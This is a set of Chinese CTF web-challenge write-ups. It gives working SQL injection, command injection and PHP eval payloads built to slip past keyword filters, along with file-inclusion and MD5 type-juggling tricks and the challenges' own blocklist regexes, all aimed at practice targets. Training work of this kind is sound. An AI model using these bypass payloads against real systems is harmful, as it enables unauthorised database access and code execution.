# 基础
## BabySQL[极客大挑战 2019]
```sql
1' order by 3#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732275065300-453f8022-c6de-49d9-86d0-b12d7b03acf9.png)

试试联合注入 union 和 select 都被过滤了

```sql
-1' union select group_concat(table_name) from information_schema.tables#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732275387806-76d7771c-5d26-4388-8cf8-eaafbab7a126.png)

试试双写绕过，可以。就是字段数不一样

```sql
-1' ununionion selselectect group_concat(database())#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732275772022-cc58a8ae-648f-433d-b393-4a4a176839a8.png)

3 个字段可以

```sql
-1' ununionion selselectect 1,2,group_concat(database())#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732275862952-e3110abf-2da9-42af-bd9e-843b1a17093e.png)

下一步看出from， where 被过滤了

```sql
-1' ununionion selselectect 1,2,group_concat(table_name) from information_schema.tables where table_schema='geek'#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732275979049-78f0b705-dfe4-4a29-8449-0515ccbda90e.png)

双写

```sql
-1' ununionion selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema='geek'#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732276289917-022b9618-6981-454c-8afa-aeadd72509fd.png)

下一步

```sql
-1' ununionion selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whewherere table_name='b4bsql'#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732276368374-59f71a49-b46d-40a5-8994-bf5dc00371a5.png)

最后一步

```sql
-1' ununionion selselectect 1,2,group_concat(passwoorrd) frfromom b4bsql#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732276535343-23e61381-dcd4-421c-90ae-6ad1d5a8fe1b.png)

## finalrce[SWPUCTF 2021 新生赛]
```php
 <?php
highlight_file(__FILE__);
if(isset($_GET['url']))
{
    $url=$_GET['url'];
    if(preg_match('/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\"|\>|\<|\%|\$/i',$url))
    {
        echo "Sorry,you can't use this.";
    }
    else
    {
        echo "Can you see anything?";
        exec($url);
    }
} 
```

> ✨
>
> 1、要绕过正则表达式
>
> 2、exec() 函数并不回显命令执行结果，所以要进行重定向
>



```php
?url=l\s / |tee 1.txt
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736591316795-1289377a-43bc-4623-a189-41152c77c8cf.png)

```php
?url=c\at /flllll\aaaaaaggggggg |tee 1.txt
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736591503636-79e18b37-ef02-4c1f-8e60-9e1e61ee8317.png)

### 多解
> ✨这题主要对正则进行绕过
>

#### 对于 ls 命令
+ 反斜杠 \ 绕过

```php
l\s
```

+ 单双引号绕过

```php
l""s	//双引号被过滤了，不行
l''s
```

+ 特殊字符$1 到 $9 , $@ 和 $* 绕过

```php
l$1s	//禁用了$,不行
```

+ 内联执行绕过

```php
?url=a=l;b=s;$a$b / |tee 1.txt	//禁用了$,不行
```

#### 对于 cat 命令
+ 使用同等功能命令替代

```php
tac	//从最后一行读到第一行
nl	//与cat差不多，只是多了显示行号
head	//加 -n 参数，显示文件前几行
tail	//加 -n 参数，显示文件后几行
more	//支持多页显示
less	//与more差不多，多了查找和前后翻页功能
```

+ 绕过手段

> 🎆同 ls 中的内容
>

#### 管道符 |
```bash
commandA | commandB
// A 命令的输出作为B命令的输入
```

#### 重定向
> ✨ 将输出结果写入指定文件中
>

```bash
>		//覆盖文件
>> 	//追加文件
tee	//可同时写入多个文件
```

```plain
[ACTF2020 新生赛 Exec]
```

```plain
[ACTF2020 新生赛 Exec]
```







```plain
[ACTF2020 新生赛 Exec]
```

```plain
[ACTF2020 新生赛 Exec]
```































## babyrce[SWPUCTF 2021 新生赛]
```php
 <?php
error_reporting(0);
header("Content-Type:text/html;charset=utf-8");
highlight_file(__FILE__);
if($_COOKIE['admin']==1) 
{
    include "../next.php";
}
else
    echo "小饼干最好吃啦！";
?> 小饼干最好吃啦！
```

使用 hackbar

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736594972173-4cfc782f-f4a4-4155-ae7a-94267cec5b0d.png)

跳转

```php
 <?php
error_reporting(0);
highlight_file(__FILE__);
error_reporting(0);
if (isset($_GET['url'])) {
  $ip=$_GET['url'];
  if(preg_match("/ /", $ip)){
      die('nonono');
  }
  $a = shell_exec($ip);
  echo $a;
}
?> 
```

> ✨空格绕过
>

```php
?url=ls${IFS}/
?url=cat${IFS}/flllllaaaaaaggggggg
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736595299307-7b975767-8324-489f-a20f-487920864988.png)

### 多解
+ %09 绕过（相当于 tab）

```php
?url=ls%09/
```

+ $IFS 和$IFS$9 （和${IFS}一样）

```php
?url=ls$IFS/
```

## Exec1[ACTF2020 新生赛]
![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736593817404-97c52ab3-c6c7-4d94-9007-a17f95c6186b.png)

随便 ping 一下

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736593898563-6252e122-1fc6-4032-a162-79cc03320aa1.png)

试一下是不是多命令执行

```bash
127.0.0.1;ls
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736594018037-277faa72-03a4-4ab7-a865-410112d9242b.png)

```bash
127.0.0.1;cat /flag
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736594091495-9b21235d-285e-4312-b989-080d34f48465.png)

### 多解
```bash
commandA;commandB		// A,B都可以执行
commandA|commandB		// 管道符
commandA||commandB	// A执行不成功，B才能执行
commandA&commandB		// A,B都可以执行
commandA&&commandB	// A执行成功，B才能执行
```

##  webdog1__start[SWPUCTF 2022 新生赛]
![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736598545766-47095383-fd69-4a4d-afb9-8a21ebc014f5.png)

```php
?web=0e215962017
```

寻找信息，提到了机器人

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736598860962-cc6995f8-f786-4983-a33e-b9473541f46c.png)

进入 robots.txt

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736598956984-13acdf42-88f3-4977-85df-9ccba4e90747.png)  
跳转，在请求头里找到提示

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736599107990-cdd768d2-9d6f-4445-8bfd-9b7a7e7391a1.png)

```php

<?php
error_reporting(0);


highlight_file(__FILE__);



if (isset($_GET['get'])){
    $get=$_GET['get'];
    if(!strstr($get," ")){
        $get = str_ireplace("flag", " ", $get);
        
        if (strlen($get)>18){
            die("This is too long.");
            }
            
            else{
                eval($get);
          } 
    }else {
        die("nonono"); 
    }

}


    

?> 
```

> ✨禁用空格且长度不能太长
>

```php
/?url=system("ls%09/");
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736599858152-a04bf399-08b9-4ebc-afe6-63f5af15a48f.png)

```php
/?get=system("cat%09/f*");
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736599916291-f11a12ae-d76d-4c68-8a6e-6c7de617984c.png)

# 进阶
## easy_sql[SWPUCTF 2021 新生赛]
题目与提示

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736600053388-d3cb53c0-5dc6-4af8-a493-d10938d37fcc.png)![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736600036361-d325073c-1450-4385-963a-c522975f76fd.png)

反斜杠确定单引号闭合

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736600102990-ed089399-74fd-4f82-a551-ae09465a07d2.png)

确定表格为 3 列

```sql
?wllm=1' order by 3--+//回显成功
?wllm=1' order by 4--+//回显失败
```

确定回显位为 2，3 位

```sql
?wllm=-1' union select 1,2,3--+
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736600504329-208fcbb7-8bfd-4fc2-a75e-07f8a1798ad4.png)

确定当当前数据数据库和版本

```sql
?wllm=-1' union select 1,database(),version()--+
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736600444799-0b3d5b39-8860-469a-991e-2db76dfa0cef.png)

爆表

```sql
?wllm=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='test_db'--+
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736600972079-688ec87b-fdb7-4862-bb29-1bff8fdd153a.png)

爆字段

```sql
?wllm=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='test_tb'--+
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736601029604-cce9ac45-e6d7-4420-b637-77c2a2deccce.png)

```sql
?wllm=-1' union select 1,2,group_concat(flag) from test_tb--+
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736601101160-742428f4-9733-4777-ae52-88696442231b.png)

> ✨很普通的注入题，用 sqlmap 可以一键解决，不演示了
>

## 禁止套娃[GXYCTF2019]
使用 dirsearch 啥也没扫出来

> ✨猜测是 git 泄露
>

使用 Githack 试一下

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736602310811-e602414b-09af-4916-b590-6fb623531aa8.png)

```php
<?php
include "flag.php";
echo "flag在哪里呢？<br>";
if(isset($_GET['exp'])){
    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
                // echo $_GET['exp'];
                @eval($_GET['exp']);
            }
            else{
                die("还差一点哦！");
            }
        }
        else{
            die("再好好想想！");
        }
    }
    else{
        die("还想读flag，臭弟弟！");
    }
}
// highlight_file(__FILE__);
?>
```

> ✨
>
> 禁用了伪协议，还使用了正则匹配
>
> 对正则进行详细解释
>
> /[a-z,_]+	是 a 到 z 的小写字母和下划线出现一次到多次
>
> \( 匹配左括号
>
> \) 匹配右括号
>
> (?R)? 整个表达式的匹配规则在这里重复匹配
>
> 而整个表达式的规则是无参数函数形式，即 abc(); 形式，括号里可以继续嵌套无参函数。
>

看别人的 wp 构造 payload

```php
exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))));
```

> ✨
>
> + highlight_file() 函数对文件进行语法高亮显示，本函数是show_source() 的别名
> + next() 输出数组中的当前元素和下一个元素的值。
> + array_reverse() 函数以相反的元素顺序返回数组。(主要是能返回值)
> + scandir() 函数返回指定目录中的文件和目录的数组。
> + pos() 输出数组中的当前元素的值。
> + localeconv() 函数返回一个包含本地数字及货币格式信息的数组，该数组的第一个元素就是"."。
>

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736661700520-658e0eb6-6ac4-4dce-bce5-0356692a0a9b.png)

### 解析
先传入 var_dump(localeconc());  ，发现传回来一个数组

```php
array(18){
  ["decimal_point"]=>
  string(1) "."
  ["thousands_sep"]=>
  string(0) ""
  ["int_curr_symbol"]=>
  string(0) ""
  ["currency_symbol"]=>
  string(0) ""
  ["mon_decimal_point"]=>
  string(0) ""
  ["mon_thousands_sep"]=>
  string(0) ""
  ["positive_sign"]=>
  string(0) ""
  ["negative_sign"]=>
  string(0) ""
  ["int_frac_digits"]=>
  int(127)
  ["frac_digits"]=>
  int(127)
  ["p_cs_precedes"]=>
  int(127)
  ["p_sep_by_space"]=>
  int(127)
  ["n_cs_precedes"]=>
  int(127)
  ["n_sep_by_space"]=>
  int(127)
  ["p_sign_posn"]=>
  int(127)
  ["n_sign_posn"]=>
  int(127)
  ["grouping"]=>
  array(0) {
  }
  ["mon_grouping"]=>
  array(0) {
  }
}
```

> 发现第一个元素是  .  ，可以用来代表当前目录
>
> 使用 pos() 函数获取这个点
>
> 再用 scandir() 扫描当前目录
>

```php
/?exp=var_dump(scandir(pos(localeconv())));
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736663479990-8651bf81-bc51-4cbe-852c-af5aa7f14ef7.png)

> 第四个正是需要读取的文件，可以倒序数组读第二个。再用 highlight_file() 高亮显示文本
>

```php
/?exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))));
```

### 解法二
看别人的 wp

> ✨
>
> 因为并没用禁用，session_id() 函数，所以可以用。
>
> 因为 php 默认不使用 session, 要使用 session_start()函数告诉 php 开启 session
>

```php
/?exp=highlight_file(session_id(session_start()));
```



##  简单包含[鹏城杯 2022]
```php
 <?php 
highlight_file(__FILE__);
include($_POST["flag"]);
//flag in /var/www/html/flag.php; 
```

直接读会被 waf

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736602933072-14cb97f7-8732-45a2-b100-3c3745959b3d.png)

使用 php 伪协议读，发现依旧会被 waf

```php
flag=php://filter/read=convert.base64-encode/resource=flag.php
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736603185149-f9691afd-603f-4670-b429-6b830b749d6b.png)

读一下 index.php，解码

```php
<?php

$path = $_POST["flag"];

if (strlen(file_get_contents('php://input')) < 800 && preg_match('/flag/', $path)) {
    echo 'nssctf waf!';
} else {
    @include($path);
}
?>
```

发现大于 输入长度大于 800 就可以失效

```php
q=1234567876352434567686543234567876352434567686543234567876352434567686543234567876352434567686543234567876352434567686543234567876352434567686543234567876352434567686543234567876352434567686543234567876352434567686543234567876352434567686543234567876352434567686543234567876352434567686543234567876352434567686543234567876352434567686543234567876352434567686543234567876352434567686543234567876352434567686543234567876352434567686543234567876352434567686543234567876352434567686543234567876352434567686543234567876352434567686543234567876352434567686543234567876352434567686543234567876352434567686543234567876352434567686543234567876352434567686543234567876352434567686543234567876352434567686543234567876352434567686543234567876352434567686543234567876352434567686543234567876352434567686543234567876352434567686543234567876352434567686543234567876352434567686543&flag=php://filter/read=convert.base64-encode/resource=flag.php
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736603583422-ed69e875-1465-47dd-9abf-2517c33c50c6.png)

解码

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736603617394-7702f300-e3a7-424f-8eef-a0643464bd92.png)

## md5简单题目
```php
<?php
highlight_file(__FILE__);
include_once('flag.php');

if(isset($_POST['a'])&&!preg_match('/[0-9]/',$_POST['a'])&&intval($_POST['a'])){
    if(isset($_POST['b1'])&&$_POST['b2']){
        if($_POST['b1']!=$_POST['b2']&&md5($_POST['b1'])===md5($_POST['b2'])){
            if($_POST['c1']!=$_POST['c2']&&is_string($_POST['c1'])&&is_string($_POST['c2'])&&md5($_POST['c1'])==md5($_POST['c2'])){
                echo $flag;
            }else{
                echo "yee";
            }
        }else{
            echo "nop";
        }
    }else{
        echo "go on";
    }
}else{
    echo "let's get some php";
}
?> 
```

> ✨
>
> 第一处要求 a 不能有数字，而且 a 转为整数后不为零
>
> 但是 preg_match() 不能过滤数组，可以用数组绕过
>

```php
a[]=1
```

> ✨
>
> 第二处要求 md5 强碰撞后相等
>
> 可以数组绕过
>

这里举出一例

```php
b1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
b2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2
```

> ✨
>
> 第三处要求字符串且弱相等，这就有很多了
>

```php
a[]=1&b1[]=1&b2[]=2&c1=s155964671a&c2=s1184209335a
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736604706502-7f2a1818-fcca-4b71-b637-56f2a28c80bb.png)

## 进阶md5
![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736654583834-c980cbb6-7374-4d8a-95d2-8bd2d6e0b65f.png)

这是一个神奇的字符串，MD5 之后就是万能密码

```php
ffifdyop
```

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736654615922-838455fa-a3bc-44c5-a4e6-b6d7386a1e4a.png)

第二关看注释

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736654647810-b1fa3675-0e71-43da-8060-e3a46330b597.png)

弱相等,数组绕过

```php
/?x[]=1&y[]=2
```

之后会跳转，删去红框标记的部分

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736655425745-b57739e7-0d92-440e-9b56-a8b6cdae628a.png)

最后一关强碰撞，数组绕过

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736655469375-9709fadc-4a00-440e-96ea-fa8edb0bf3b2.png)

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736655557283-cf21c530-007f-4ea4-8145-6080f3630e83.png)

# 挑战自我
## [极客大挑战 2019]HardSQL 1
发现好多关键字和符号都被过滤了

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732278569110-54a6caad-aa59-441b-8adf-c2ccce234b6b.png)

尝试报错注入,and 和空格被过滤了

```sql
1'or(updatexml(1,concat(0x7e,database(),0x7e),1))#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732279437112-440fb8bf-cc97-488d-a873-e1c79cbe4f75.png)

等于号被过滤了，用 like 替代

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732280011054-7149e318-f20a-4dba-886c-9cf6543d46f8.png)

爆表

```sql
1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732280296909-662a72fb-565e-4f57-9c96-6a513a87136f.png)

爆 flag 前半段

```sql
1'or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e),1))#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732280457483-61e56ef5-5a78-4651-9783-d6d4646676c3.png)

并不完整，借助 right 函数

```sql
# right()：顾名思义就是从右边截取字符串。
# 用法：right(str, length)，即：right(被截取字符串， 截取长度)
1'or(updatexml(1,concat(0x7e,(select(group_concat(right(password,25)))from(H4rDsq1)),0x7e),1))#
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732280998389-ab412ac8-881d-41ff-952d-7d99c9e2961d.png)

##  朴实无华[WUSTCTF 2020]
敏感一点儿

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736657322727-a8efbe8c-3f97-45da-b316-63548eff1b33.png)

/robots.txt

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736657418213-28bc54be-b50f-4e30-a27c-d24e7443b996.png)

跳转，请求头发现提示

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736657498736-59cac7f3-5d58-4e55-b7f3-47967b8b545a.png)

```php
<img src="/img.jpg">
<?php
header('Content-type:text/html;charset=utf-8');
error_reporting(0);
highlight_file(__file__);


//level 1
if (isset($_GET['num'])){
    $num = $_GET['num'];
    if(intval($num) < 2020 && intval($num + 1) > 2021){
        echo "我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.</br>";
    }else{
        die("金钱解决不了穷人的本质问题");
    }
}else{
    die("去非洲吧");
}
//level 2
if (isset($_GET['md5'])){
   $md5=$_GET['md5'];
   if ($md5==md5($md5))
       echo "想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.</br>";
   else
       die("我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲");
}else{
    die("去非洲吧");
}

//get flag
if (isset($_GET['get_flag'])){
    $get_flag = $_GET['get_flag'];
    if(!strstr($get_flag," ")){
        $get_flag = str_ireplace("cat", "wctf2020", $get_flag);
        echo "想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.</br>";
        system($get_flag);
    }else{
        die("快到非洲了");
    }
}else{
    die("去非洲吧");
}
?> 
```

> ✨
>
> 第一关使用 十六进制 绕过
>
> ![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736659676385-97c04615-c7c4-4eba-b1f0-d38b8e46f486.png)
>
> intval() 为强制类型转换，会将第一个字母目前所有数字作为整数
>
> $a+1 是隐式类型转换，会将 16 进制转换为 10 进制后再加 1
>
> 
>
> 第二关 md5 之后与自身相等，MD5=0e215962017
>
> 第三关命令执行，过滤了空格和 cat
>

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736658515924-74bf5014-c124-4751-8c80-2f8891279cfe.png)

![](https://cdn.nlark.com/yuque/0/2025/png/49936693/1736658436486-804f8a67-f953-4bda-a055-42d29548cdd4.png)

粘一下总的 url 参数

```php
?/num=0x890&md5=0e215962017&get_flag=tac${IFS}fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag
```

